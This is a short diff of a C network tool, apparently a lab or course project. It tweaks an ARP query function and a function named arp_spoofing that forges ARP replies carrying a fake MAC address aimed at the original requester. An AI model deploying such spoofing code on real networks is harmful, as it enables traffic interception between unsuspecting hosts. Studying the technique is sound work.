@@ -167,7 +167,7 @@ void arp_query(char *argv[])
 		perror("ARP query socket error");
 	}
 	
-	//strcpy(query_ip,argv[2]);
+	//encapsulte IP address  into packet
 	inet_pton(AF_INET, argv[2], &target_address);
 	
 	memcpy(&query.eth_hdr.ether_dhost,"\xff\xff\xff\xff\xff\xff",ETH_ALEN); // query <- Destination MAC address
@@ -338,10 +338,10 @@ void arp_spoofing(struct ether_addr *fakemac, struct ether_arp *packet)
 	//set ARP op code -reply 
 	set_op_code(&rp.arp, ARPOP_REPLY); 
 	
-	set_sender_hardware_addr(&rp.arp, (unsigned char *)fakemac);
-	set_sender_protocol_addr(&rp.arp, (unsigned char *)(packet->arp_tpa));
-	set_target_hardware_addr(&rp.arp, (unsigned char *)(packet->arp_sha)); // set target hrd as orig sender hrd
-	set_target_protocol_addr(&rp.arp, (unsigned char *)(packet->arp_spa));	// set target pa as orig sender tpa
+	set_sender_hardware_addr(&rp.arp, (char *)fakemac);
+	set_sender_protocol_addr(&rp.arp, (char *)(packet->arp_tpa));
+	set_target_hardware_addr(&rp.arp, (char *)(packet->arp_sha)); // set target hrd as orig sender hrd
+	set_target_protocol_addr(&rp.arp, (char *)(packet->arp_spa));	// set target pa as orig sender tpa
 	
 	// set 
 	victim.sll_family = AF_PACKET;
